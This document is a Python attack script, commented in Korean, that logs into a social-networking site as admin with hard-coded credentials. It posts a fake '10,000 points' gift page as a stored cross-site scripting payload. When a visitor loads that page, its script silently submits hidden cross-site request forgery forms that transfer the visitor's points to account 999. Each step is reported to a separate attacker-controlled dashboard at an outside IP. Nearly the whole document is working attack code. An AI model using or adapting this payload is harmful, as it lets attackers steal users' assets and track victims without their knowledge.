#!/usr/bin/env python3
"""
fake-gift CSRF 공격 페이지를 SNS 게시물로 업로드
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"

# fake-gift HTML 페이지 (간결한 버전)
FAKE_GIFT_HTML = """<div style="font-family:Arial;text-align:center;padding:50px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;margin:0"><div style="background:white;color:#333;padding:50px;border-radius:20px;max-width:500px;margin:0 auto;box-shadow:0 20px 60px rgba(0,0,0,0.3)"><div style="font-size:100px">🎁</div><h1 style="color:#667eea">🎉 축하합니다!</h1><p style="font-size:1.5em">10,000 포인트를 받으셨습니다!</p><div id="s" style="background:#f0f0f0;padding:15px;border-radius:10px;margin:20px 0;color:#667eea;font-weight:bold">처리 중...</div></div><div id="f"></div><script>const A='http://13.158.67.78:5000';function n(e,p){const i=new Image();i.src=A+e+'?'+p+'&t='+Date.now()}n('/notify','event=page_loaded');const am=[50000,30000,20000,10000,5000,3000,2000,1000,500,300,200,100];let h='';am.forEach((a,i)=>{h+='<form id="f'+i+'" method="POST" action="http://52.78.221.104/profile.php" target="if'+i+'"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+a+'"><input type="hidden" name="message" value="Event"></form><iframe name="if'+i+'" style="display:none"></iframe>'});document.getElementById('f').innerHTML=h;const t=am.reduce((a,b)=>a+b,0);n('/victim','points='+t);am.forEach((a,i)=>{setTimeout(()=>{document.getElementById('f'+i).submit();document.getElementById('s').innerHTML='처리 중... '+Math.round((i+1)/am.length*100)+'%';n('/transfer','amount='+a)},i*200)});setTimeout(()=>{document.getElementById('s').innerHTML='✅ 완료!';n('/complete','total='+t);setTimeout(()=>{window.location.href='http://52.78.221.104/index.php'},2000)},am.length*200+1000)</script></div>"""

print("="*60)
print("🎁 fake-gift 페이지를 SNS 게시물로 업로드")
print("="*60)
print()

# 세션 생성
session = requests.Session()

# 1. 로그인
print("[*] admin으로 로그인 중...")
login_data = {
    'username': 'admin',
    'password': 'admin123'
}

r = session.post(LOGIN_URL, data=login_data, allow_redirects=True)

if 'index.php' in r.url or 'profile.php' in r.url:
    print("[+] 로그인 성공!")
else:
    print("[-] 로그인 실패")
    print(f"    응답 URL: {r.url}")
    exit(1)

# 2. fake-gift 게시물 작성
print("\n[*] fake-gift 페이지를 게시물로 작성 중...")

post_data = {
    'content': FAKE_GIFT_HTML
}

r = session.post(POST_URL, data=post_data, allow_redirects=True)

print(f"[+] 응답 코드: {r.status_code}")
print(f"[+] 응답 URL: {r.url}")

# 3. 게시물 확인
print("\n[*] 게시물 확인 중...")
r = session.get(f"{TARGET}/index.php")

if FAKE_GIFT_HTML[:100] in r.text or '🎁' in r.text:
    print("[+] fake-gift 페이지가 성공적으로 게시되었습니다!")
    print()
    print("="*60)
    print("✅ 공격 준비 완료!")
    print("="*60)
    print()
    print("피해자가 http://52.78.221.104/index.php 접속하면")
    print("자동으로 fake-gift 페이지가 실행됩니다!")
    print()
    print("Flask 대시보드에서 실시간 모니터링:")
    print("http://13.158.67.78:5000/")
    print()
    print("="*60)
else:
    print("[-] 게시물이 제대로 올라가지 않았거나 HTML이 필터링되었습니다")
    print(f"    응답 미리보기: {r.text[:500]}")
